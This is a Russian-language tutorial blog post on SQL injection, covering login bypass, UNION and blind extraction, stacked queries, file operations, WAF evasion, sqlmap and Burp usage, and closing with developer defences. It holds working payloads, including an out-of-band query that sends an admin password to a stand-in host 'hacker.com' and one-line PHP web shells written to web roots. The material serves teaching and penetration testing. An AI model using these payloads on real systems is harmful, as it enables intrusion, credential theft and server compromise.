---
title: "SQL-инъекция (SQL Injection, SQLi): Краткое руководство"
description: Базовая информация о SQLi
date: 2025-11-04
category: Уязвимости
author: veilosophy
---

## Введение: Что такое SQL-инъекция?

Представьте, что вы заказываете еду в ресторане. Вы говорите официанту: "Принесите мне, пожалуйста, **салат**". Официант (это ваше веб-приложение) берет ваше слово и передает его повару (это база данных). Повар готовит салат. Все просто.

**SQL-инъекция (SQLi)** — это когда вы, вместо названия блюда, говорите официанту что-то вроде: "Принесите мне **салат, а затем скажите повару, чтобы он отдал мне всю выручку из кассы**".

**SQL (Structured Query Language)** — это язык, на котором "общаются" веб-приложения и базы данных. База данных хранит всю важную информацию: логины, пароли, данные клиентов, статьи и т.д.

**Инъекция** — это когда злоумышленник "впрыскивает" в обычный запрос (например, ввод логина или поиск) свой собственный, вредоносный код на языке SQL.

**Суть проблемы:** Приложение не отличает обычные данные (например, ваше имя) от команд (например, "УДАЛИТЬ ВСЕ ТАБЛИЦЫ"). Оно просто склеивает ваш ввод с командой, которую собиралось отправить базе данных.

> **Простыми словами:** SQLi — это уязвимость, которая позволяет хакеру обмануть базу данных, заставив ее выполнить не ту команду, которую задумал разработчик, а ту, которую подсунул злоумышленник.

## 1. Механизм Атаки: От Простого Обхода до Извлечения Данных

Уязвимость возникает, когда разработчик создает SQL-запрос, используя **конкатенацию строк** (простое склеивание текста), вместо безопасных **параметризованных запросов**.

### 1.1. Обход Авторизации (Login Bypass)

Представьте, что вы вводите логин и пароль. Приложение формирует такой запрос к базе данных:

```sql
SELECT * FROM users WHERE username = 'ВАШ_ЛОГИН' AND password = 'ВАШ_ПАРОЛЬ';
```

**Атака:**
Злоумышленник вводит в поле логина: `admin' OR '1'='1--`

**Что происходит с запросом:**
Приложение склеивает ввод и получает:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = '...';
```

*   Часть `OR '1'='1'` всегда истинна.
*   Часть `--` (или `#`) превращает остаток запроса (включая проверку пароля) в комментарий, который игнорируется базой данных.
*   **Результат:** Злоумышленник входит в систему под учетной записью администратора, не зная пароля.

### 1.2. Извлечение Данных (UNION Attack)

Эта техника используется для того, чтобы заставить базу данных показать данные из других таблиц, используя оператор `UNION`.

**Шаги:**
1.  **Определение количества столбцов:** Используется `ORDER BY N` до тех пор, пока запрос не перестанет выдавать ошибку.
2.  **Инъекция:** Используется `UNION SELECT` с нужным количеством столбцов для извлечения данных из системных таблиц.

**Пример (MySQL):**
`1' UNION SELECT 1, database(), user(), version(), 5, 6, 7--` (если столбцов 7)

## 2. Классификация SQL-инъекций: Полный Анализ

SQLi делятся на типы в зависимости от того, как злоумышленник получает ответ от базы данных.

| Тип атаки | Описание | Как работает (Технически) | Пример ввода |
| :--- | :--- | :--- | :--- |
| **In-band SQLi** (Классическая) | Самый простой тип. База данных "выплевывает" информацию прямо на страницу, которую видит хакер. | Ответ базы данных (данные или ошибка) **отображается прямо на веб-странице**. Включает `UNION SELECT` и `Error-based` атаки. | `1' UNION SELECT 1, 'username', 'password' FROM users--` |
| **Inferential SQLi** (Слепая) | База данных молчит и ничего не показывает. Хакер "угадывает" информацию, задавая вопросы, на которые можно ответить только "Да" или "Нет". | Информация извлекается посимвольно, анализируя поведение приложения (время ответа или изменение страницы). | Непрямой ввод, основанный на логике: `1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--` |
| **Boolean-based Blind SQLi** | Хакер задает вопрос: "Первая буква пароля — 'A'?" Если страница выглядит нормально — ответ "Да". Если страница изменилась — ответ "Нет". | Запрос возвращает либо `TRUE`, либо `FALSE`. Посимвольно извлекает данные, проверяя каждое условие. | `1' AND 1=1 AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--` |
| **Time-based Blind SQLi** | Хакер задает вопрос: "Первая буква пароля — 'A'? Если да, подожди 10 секунд". По времени ответа сервера определяется истинность условия. | Запрос заставляет базу данных "задуматься" (`SLEEP(N)`) на несколько секунд, если условие истинно. | `1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--` |
| **Out-of-band SQLi** (Внеполосная) | Редкий тип. Хакер заставляет базу данных отправить украденные данные на его личный сервер (например, через DNS-запрос), минуя веб-страницу. | Используется, когда нет возможности получить ответ через веб-приложение. Злоумышленник использует функции БД для внешних сетевых запросов. | `1' AND (SELECT load_file(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.hacker.com\\a')))--` |

## 3. Продвинутые Техники Эксплуатации (Уровень: Профессионал)

Профессиональный анализ не ограничивается поиском кавычки. Он включает глубокое понимание возможностей СУБД и методов обхода защиты.

### 3.1. Перечисление (Enumeration) Базы Данных

После подтверждения SQLi, следующая цель — извлечение метаданных (схем, таблиц, столбцов). Это критически важно для построения точного запроса на извлечение данных.

| СУБД | Системная Схема (для метаданных) | Функция Конкатенации |
| :--- | :--- | :--- |
| **MySQL** | `information_schema` | `CONCAT()`, `CONCAT_WS()` |
| **PostgreSQL** | `pg_catalog`, `information_schema` | `||` (оператор конкатенации) |
| **MSSQL** | `sys.tables`, `sys.columns` | `+` (оператор конкатенации) |
| **Oracle** | `ALL_TABLES`, `ALL_TAB_COLUMNS` | `||` (оператор конкатенации) |

### 3.2. Стековые Запросы (Stacked Queries)

Стековые запросы позволяют выполнить несколько SQL-операторов в одном вызове, разделяя их точкой с запятой (`;`). Это позволяет не только извлекать данные, но и **модифицировать** или **удалять** их.

> **Важно:** Эта техника работает только в СУБД, которые поддерживают множественные запросы в одном вызове (например, MSSQL, PostgreSQL, MySQL с определенными драйверами).

**Пример (MSSQL):**
Ввод: `1; UPDATE users SET password = 'new_pass' WHERE username = 'admin'; --`
Итоговый запрос: `SELECT * FROM products WHERE id = 1; UPDATE users SET password = 'new_pass' WHERE username = 'admin'; --`

### 3.3. Чтение и Запись Файлов (File Operations / RCE)

Если у пользователя СУБД есть достаточные привилегии (`FILE` в MySQL), можно читать и записывать файлы на сервере, что часто приводит к полной компрометации сервера (RCE - Remote Code Execution).

| СУБД | Чтение Файла | Запись Файла (Web Shell) |
| :--- | :--- | :--- |
| **MySQL** | `LOAD_FILE('/etc/passwd')` | `SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'` |
| **PostgreSQL** | `COPY (SELECT * FROM pg_catalog.pg_settings) TO '/tmp/settings.txt'` | `COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php'` |
| **MSSQL** | `xp_cmdshell 'type c:\boot.ini'` | `xp_cmdshell 'echo ^<?php system($_GET[\"cmd\"]); ?^> > c:\inetpub\wwwroot\shell.php'` |

### 3.4. Обход WAF и IDS (Bypassing WAF/IDS)

Профессионал должен уметь обходить фильтры, которые ищут ключевые слова (`UNION`, `SELECT`, `OR`).

| Техника Обхода | Пример | Принцип |
| :--- | :--- | :--- |
| **Комментарии** | `UNI/**/ON SEL/**/ECT` | Разделение ключевых слов комментариями (`/**/`, `--`, `#`). |
| **Кодирование URL** | `%55%4e%49%4f%4e%20%53%45%4c%45%43%54` | Использование URL-кодирования для обхода простых строковых фильтров. |
| **Шестнадцатеричное/ASCII кодирование** | `SELECT CHAR(117, 115, 101, 114)` | Использование функций СУБД для кодирования строк, чтобы избежать обнаружения ключевых слов. |

### 3.5. Специфические Примеры Blind SQLi для Разных СУБД

Blind SQLi требует использования специфических функций для задержки или логического вывода.

| СУБД | Time-based (Задержка) | Boolean-based (Логика) |
| :--- | :--- | :--- |
| **MySQL** | `IF(УСЛОВИЕ, SLEEP(5), 0)` | `... AND (SELECT 1 FROM users WHERE ...)` |
| **PostgreSQL** | `SELECT pg_sleep(5)` | `... AND EXISTS(SELECT 1 FROM users WHERE ...)` |
| **MSSQL** | `WAITFOR DELAY '0:0:5'` | `... AND 1=(SELECT 1 FROM users WHERE ...)` |
| **Oracle** | `DBMS_PIPE.RECEIVE_MESSAGE('a', 5)` | `... AND 1=(SELECT 1 FROM DUAL WHERE ...)` |

## 4. Практические Инструменты и Методология

Обнаружение SQL-инъекций делится на **автоматическое** (сканеры) и **ручное** (тестирование).

### 4.1. Автоматическое Обнаружение (Сканеры)

| Инструмент | Тип | Назначение и Профессиональное Применение |
| :--- | :--- | :--- |
| **sqlmap** | Офлайн (CLI) | **Must-have.** Используется для быстрой проверки и эксплуатации. **Профи-фичи:** Использование `--tamper` для обхода WAF, `--os-shell` для RCE, `--file-read/--file-write` для файловых операций, `--dns-domain` для OOB-атак. |
| **Burp Suite Professional** | Ручной/Полуавтомат (GUI) | **Прокси и Платформа.** Используется для ручного тестирования. **Профи-фичи:** Модуль **Intruder** для автоматизации Blind SQLi (поиск по времени или булеву ответу), **Extender** для интеграции кастомных скриптов. |
| **OWASP ZAP** | Офлайн (GUI/CLI) | **Open Source Альтернатива.** Используется для интеграции в CI/CD. **Применение:** Отличный выбор для начинающих и для автоматического тестирования. |
| **NoSQLMap** | Офлайн (CLI) | **Специализированный.** Используется для обнаружения и эксплуатации уязвимостей в NoSQL базах данных (MongoDB, CouchDB), которые часто имеют схожие с SQLi проблемы. |

### 4.2. Ручное Обнаружение (Тестирование)

Ручное тестирование требует понимания принципов SQLi, но позволяет находить уязвимости, которые сканеры могут пропустить.

| Инструмент/Метод | Тип | Описание и Как использовать |
| :--- | :--- | :--- |
| **Burp Suite Community/Pro** | Офлайн (GUI) | **Прокси-инструмент.** Позволяет перехватывать, просматривать и изменять HTTP-запросы. **Как использовать:** Перехватите запрос и вручную измените любой параметр (например, добавьте `'` или `OR 1=1`) перед отправкой на сервер. |
| **Простые тестовые строки** | Ручной ввод | **Самый быстрый способ "пощупать" уязвимость.** **Как использовать:** Введите в поле формы или URL-параметр специальные символы и конструкции: |
| | | *   **Одинарная кавычка (`'`):** Часто вызывает ошибку SQL, которая может раскрыть тип базы данных. |
| | | *   **Логический обход (`admin' OR '1'='1--`):** Проверка на обход авторизации. |

### 4.3. Методология Ручного Тестирования (Профессиональный Пентест)

1.  **Идентификация Точки Ввода:** Найти все места, где пользовательский ввод попадает в запрос (URL-параметры, POST-данные, HTTP-заголовки, Cookies).
2.  **Проверка на Ошибки:** Ввод одиночной кавычки (`'`) для вызова ошибки СУБД и определения типа базы данных.
3.  **Проверка на Булеву Слепую Инъекцию:** Ввод логических условий (`AND 1=1`, `AND 1=2`) и анализ изменения контента страницы.
4.  **Перечисление Метаданных:** Использование `UNION SELECT` и системных таблиц (`information_schema`) для извлечения имен таблиц и столбцов.
5.  **Повышение Привилегий:** Попытка RCE через файловые операции или стековые запросы.

(конечно есть и другие инструменты, но тут в основном привел только основные)

## 5. Защита (Для Разработчиков)

Защита от SQLi — это многоуровневый процесс, а не просто одна функция.

1.  **Параметризованные Запросы (Prepared Statements):** **Обязательно.** Это единственный надежный способ гарантировать, что пользовательский ввод всегда будет обрабатываться как данные, а не как код.
2.  **Принцип Наименьших Привилегий (PoLP):** Учетная запись СУБД, используемая веб-приложением, должна иметь только минимально необходимые права. **Запретить** права на `DROP`, `ALTER`, доступ к системным таблицам, `xp_cmdshell`, `LOAD_FILE`.
3.  **ORM (Object-Relational Mapping):** Использование современных ORM (например, SQLAlchemy, Django ORM) по умолчанию использует параметризованные запросы.
4.  **WAF (Web Application Firewall):** Использование WAF (например, ModSecurity, Cloudflare WAF) как дополнительного уровня защиты для фильтрации очевидных атак. **Важно:** WAF не заменяет безопасное кодирование.
